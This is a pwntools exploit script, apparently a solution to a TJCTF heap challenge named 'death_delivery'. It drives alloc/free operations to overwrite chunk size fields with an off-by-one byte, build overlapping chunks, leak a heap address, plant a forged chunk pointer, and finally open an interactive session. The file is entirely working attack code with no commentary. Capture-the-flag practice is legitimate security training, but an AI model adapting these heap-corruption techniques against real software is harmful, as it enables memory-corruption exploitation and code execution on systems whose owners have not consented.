from pwn import *

e = ELF("./death_delivery")
p = process(e.path)
#p = remote("p1.tjctf.org", 8011)

nums = 0
def alloc(p, length, idx=-1, data=""):
  p.clean()
  
  global nums 
  if idx == -1:
    idx = nums
    nums += 1
  if len(data) == 0:
    data = str(idx) * 8
  
  p.sendline(str(idx))
  p.sendlineafter("\n", str(length))
  
  if len(data) == length + 1:
    p.send(data)
  else:
    p.sendline(data) 
  return idx 

def free(p, idx):
  p.clean()

  p.sendline(str(idx))
  p.sendlineafter("\n", "-1")

A = alloc(p, 0x88)
B = alloc(p, 0x88)
C = alloc(p, 0xd8)

header = alloc(p, 0x100)

free(p, A)
free(p, B)

alloc(p, 0x88, A, 0x88 * "A" + p64(0xf1)[0])
alloc(p, 0xe8, B, 0x88 * "B" + p64(0xe1))

free(p, C)

alloc(p, 0xd8, C, (0x58) * "A" + p64(0x21) + 5 * p64(0x31) +  p64(0x21))

free(p, B)

D = alloc(p, 0x58, data="D" * 8)
E = alloc(p, 0x28, data="E" * 8)
F = alloc(p, 0x58, data="F" * 8)

free(p, D)
free(p, F)

p.clean()
p.sendline(str(C))
p.sendlineafter("\n", "0")

heap_leak = u64(p.recvline(keepends=False).ljust(8, "\x00"))
print("Heap leak: {:#x}".format(heap_leak))

for i in range(nums):
  if i != C:
    free(p, i)

free(p, E)

E = alloc(p, 0xe8, E)
alloc(p, 0x28, A)
alloc(p, 0x58, B)


A1 = alloc(p, 0xc8)
B1 = alloc(p, 0xc8)
C1 = alloc(p, 0x20)
header_2 = alloc(p, 0x100, D)

free(p, A1)
free(p, B1)
free(p, C1)
alloc(p, 0xc8, A1, data="A" * 0xc8 + p64(0xf1)[0])
alloc(p, 0xe8, B1, data="A" * 0xc0 + p64(0xd0) + p64(0x30) + p64(heap_leak - 0x1a490d0 + 0x1a48000))

alloc(p, 0x20, C1)

free(p, header)

alloc(p, 0x20, header)


p.interactive()
